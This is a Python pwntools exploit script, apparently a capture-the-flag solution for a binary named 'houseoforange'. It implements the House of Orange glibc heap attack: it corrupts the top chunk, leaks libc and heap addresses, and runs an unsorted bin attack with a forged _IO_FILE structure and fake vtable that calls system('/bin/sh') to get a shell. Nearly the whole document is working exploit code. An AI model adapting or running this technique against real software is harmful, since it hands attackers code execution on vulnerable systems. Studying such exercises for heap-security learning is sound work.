#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
binary = './houseoforange'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

def menu(idx):
    io.recvuntil(': ')
    io.sendline(str(idx))

def see():
    menu(2)

def build(nm, length, pz, color):
    menu(1)
    io.recvuntil(":")
    io.sendline(str(length))
    io.recvuntil(":")
    io.sendline(nm)
    io.recvuntil(":")
    io.sendline(str(pz))
    io.recvuntil(":")
    io.sendline(str(color))

def upgrade(nm, length, pz, color):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(length))
    io.recvuntil(":")
    io.send(nm)
    io.recvuntil(":")
    io.sendline(str(pz))
    io.recvuntil(":")
    io.sendline(str(color))
pause()
build('0' * 8, 0x90, 1, 1)

pay = 'c' * 0x90
pay += p64(0) + p64(0x21)
pay += p32(0) + p32(0x20) + p64(0)
pay += p64(0) + p64(0xf21)
# overwrite the top chunk
pause()
upgrade(pay, len(pay), 1, 1)

# trigger _int_free()
build('1', 0x1000, 1, 1)

# build a large chunk
build('2', 0x400, 1, 1)

see()
io.recvuntil(": ")

libc_addr = myu64(io.recvn(6)) & ~(0x1000 - 1)
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
libc.address = libc_addr - 0x3bd000
log.info("\033[33m" + hex(libc.address) + "\033[0m")

# leak heap with fd_nextsize, bk_nextsize
upgrade('2' * 0x10, 0x400, 1, 1)

see()
io.recvuntil("2" * 0x10)
heap_addr = myu64(io.recvn(6)) - 0x140
log.info("\033[33m" + hex(heap_addr) + "\033[0m")



# unsorted bin attack
pay = 'a' * 0x400
pay += p64(0) + p64(0x21)
pay += p32(0x1f) + p32(0x1) + p64(0)


# stream = house_of_orange(0x555555758570,libc.symbols['system'],libc.symbols['_IO_list_all'])

stream = '/bin/sh\0' + p64(0x61)
stream += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10)

stream = stream.ljust(0xa0, '\0')
## fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
stream += p64(heap_addr + 0x610)
stream = stream.ljust(0xc0, '\0')
stream += p64(1)

pay += stream
pay += p64(0) * 2
## vtable
pay += p64(heap_addr + 0x668)
pay += p64(0) * 6
pay += p64(libc.symbols['system'])

pay += stream
upgrade(pay, 0x800, 1, 1)


io.recvuntil(":")
io.sendline('1')

io.interactive()

